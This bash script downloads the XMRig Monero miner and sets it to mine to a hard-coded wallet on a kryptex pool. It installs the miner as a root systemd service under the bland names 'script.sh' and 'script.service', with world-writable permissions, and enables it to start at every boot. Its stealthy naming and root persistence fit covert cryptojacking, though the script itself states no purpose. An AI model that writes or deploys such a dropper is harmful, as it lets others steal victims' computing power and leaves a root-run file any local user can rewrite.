#!/bin/bash
sleep 10 ;
sudo touch /etc/systemd/system/script.service ;
sudo touch /usr/local/bin/script.sh ;
sudo chmod 777 /etc/systemd/system/script.service ;
sudo chmod 777 /usr/local/bin/script.sh ;
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar zxvf xmrig-6.18.0-linux-x64.tar.gz ;

sudo echo "#!/bin/bash
./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero" > /usr/local/bin/script.sh ;

sudo echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/script.service;

sudo systemctl daemon-reload;
sudo systemctl start script.service;
sudo systemctl enable script.service;'
